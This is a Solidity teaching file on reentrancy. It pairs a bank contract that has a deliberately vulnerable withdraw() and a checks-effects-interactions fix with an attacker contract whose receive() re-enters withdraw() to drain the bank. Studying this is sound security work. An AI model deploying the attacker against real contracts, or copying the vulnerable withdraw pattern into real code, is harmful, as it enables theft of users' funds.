// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import { console } from "forge-std/console.sol";
//import { console2 } from "forge-std/console2.sol";

contract TheBank {
    mapping(address => uint) theBalances;

    function deposit() public payable {
        require(msg.value >= 1 ether, "cannot deposit below 1 ether");
        theBalances[msg.sender] += msg.value;
    }

    /*
        FIX WAY
        1. use noReentrant modifier
        2. use checks-effects-interactions pattern

    */
    function withdraw() public {
        require(
            theBalances[msg.sender] >= 1 ether,
            "must have at least one ether"
        );
        uint bal = theBalances[msg.sender];
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "transaction failed");
        // VULNERABILITY: state change after external call
        theBalances[msg.sender] = 0;
    }

     function withdrawUsingCEI() public {
        require(
            theBalances[msg.sender] >= 1 ether,
            "must have at least one ether"
        );
        uint bal = theBalances[msg.sender];
        theBalances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "withdraw failed");
    }

    function totalBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract TheAttacker {

    TheBank public theBank;
    mapping(address => uint) public balances;

    constructor(address _thebankAddress) {
        theBank = TheBank(_thebankAddress);
    }

    receive() external payable {
        if (address(theBank).balance >= 1 ether) {
            theBank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        theBank.deposit{value: 1 ether}();
        theBank.withdraw();
    }

    function attackFailed() external payable {
        require(msg.value >= 1 ether);
        theBank.deposit{value: 1 ether}();
        theBank.withdrawUsingCEI();
    }

    function getBalances() public view returns (uint) {
        return address(this).balance;
    }
}